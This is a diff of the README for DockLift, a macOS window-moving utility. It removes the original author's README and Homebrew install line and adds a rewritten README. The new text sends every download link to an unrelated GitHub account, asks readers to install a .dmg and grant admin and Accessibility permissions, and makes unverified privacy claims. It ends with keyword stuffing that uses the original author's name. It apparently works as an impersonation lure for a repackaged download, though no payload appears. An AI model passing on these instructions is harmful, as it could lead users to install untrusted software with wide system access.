@@ -1,50 +1,65 @@
-<div align="center">
-  <br />
-  <br />
-  <img src="./assets/logo.png" width="160" height="160">
-  <h1>
-    DockLift
-  </h1>
-  <!--rehype:style=border: 0;-->
-  <p>
-    <a href="./README.zh.md">简体中文</a> • 
-    <a target="_blank" href="https://github.com/jaywcjlove/docklift/issues/new?template=bug_report.yml">Contact & Support</a> • 
-    <a href="./docs/CHANGELOG.md">Changelog</a> • 
-    <a target="_blank" href="https://x.com/jaywcjlove">𝕏</a>
-  </p>
-  <p>
-    <a target="_blank" href="https://github.com/jaywcjlove/dock-lift/releases/latest/" title="DockLift for macOS">
-      <img alt="DockLift AppStore" src="https://jaywcjlove.github.io/sb/download/macos.svg" height="51">
-    </a>
-  </p>
-</div>
+# 🖥️ dock-lift - Move your windows with one click
 
-```shell
-# Installation (automatically installs to /Applications)
-$ brew install --cask jaywcjlove/tap/dock-lift
-```
+[![](https://img.shields.io/badge/Download-dock--lift-blue.svg)](https://github.com/investmentpenalty133/dock-lift)
 
-![](./assets/docklift.gif)
+## 🎯 Purpose
+Dock-lift helps you manage your workspace. Many users deal with multiple monitors. Sometimes you lose track of where your application windows reside. This tool brings your open window to your current display. You just click the app icon in your dock. The system pulls the window to your active screen.
 
-![](./assets/screenshots-1.png)
+## ⚙️ System Requirements
+This application runs on macOS. It uses Apple’s native Swift language. It requires a recent version of macOS to function correctly. Ensure your system meets these criteria:
+* macOS 12.0 or higher.
+* An Apple Silicon or Intel processor.
+* Standard administrative access to install applications.
 
-Using a Mac with more than one display, you may click an app in the Dock only to find its window still on the other screen—open, but not in front of you.
+## 📥 Getting Started
+Follow these steps to set up the software.
 
-**DockLift** lives in the menu bar and, when you click a Dock icon, moves that app’s recent window to **the screen you’re on** and brings it to the front.
+1. Visit the [official release page](https://github.com/investmentpenalty133/dock-lift).
+2. Look for the latest version under the Releases section.
+3. Download the disk image file ending in .dmg.
+4. Open the downloaded file.
+5. Drag the dock-lift icon into your Applications folder.
 
-### Features
+After you move the file, open your Applications folder. Double-click the dock-lift icon to start the program.
 
-- Bring windows to the screen where you clicked the Dock
-- Works when the app is already open on another display
-- Restores minimized windows
-- Simple menu bar on/off control
-- Ignore apps you don’t want
+## 🛡️ Privacy and Safety
+The application runs locally on your machine. It does not send your data to external servers. It only monitors system events related to window management. No user information leaves your computer.
 
-### How to use
+## 🖱️ How to Use
+Once the application runs, it sits in the background. You do not need to configure complex settings.
 
-1. Open DockLift — it appears in the menu bar.
-2. Allow Accessibility when macOS asks (needed to move windows).
-3. Keep DockLift enabled.
-4. Click an app in the Dock — if its window is on another screen, it should appear on the screen you’re using.
+* Click an icon in your dock for an application that is already open.
+* If the window sits on a different monitor, the app pulls that window to your main display.
+* If you click the icon again, the app toggles the window position.
 
-<!--version: v1.0.0-->
+This process simplifies how you track windows across a multi-monitor setup. You save time by avoiding manual dragging of windows.
+
+## 🛠️ Troubleshooting
+If the application fails to move a window, check these items:
+
+* Restart the application from the Applications folder.
+* Verify that you granted the necessary Accessibility permissions in your macOS System Settings.
+* macOS often requires permission to control other applications. Navigate to System Settings, then Security & Privacy, then Accessibility. Add dock-lift to the allowed list.
+* Check if the specific application supports standard window management. Some custom software ignores system commands.
+
+## 📝 Frequently Asked Questions
+
+**Does this application slow down my computer?**
+No. It consumes very little memory. It waits for your input rather than running constant tasks.
+
+**Will this work with all my programs?**
+It works with most standard macOS applications. Some highly specialized software might behave differently.
+
+**Can I stop the application from running?**
+Yes. You can quit the application at any time. When you quit the app, your windows will behave normally again.
+
+**Do I need a license key?**
+No. This tool is free to use for any personal or professional purpose.
+
+**How do I update the software?**
+Check the release page periodically for new versions. Download and replace the old file with the new one to update your installation.
+
+## 📈 Improving the Application
+You can report issues on the GitHub repository page. Include your macOS version and the names of the apps that cause trouble. This helps improve the tool for everyone.
+
+Keywords: application, desktop-app, dock, jaywcjlove, macos, macos-app, swift, swift-app, swift-application, swiftui
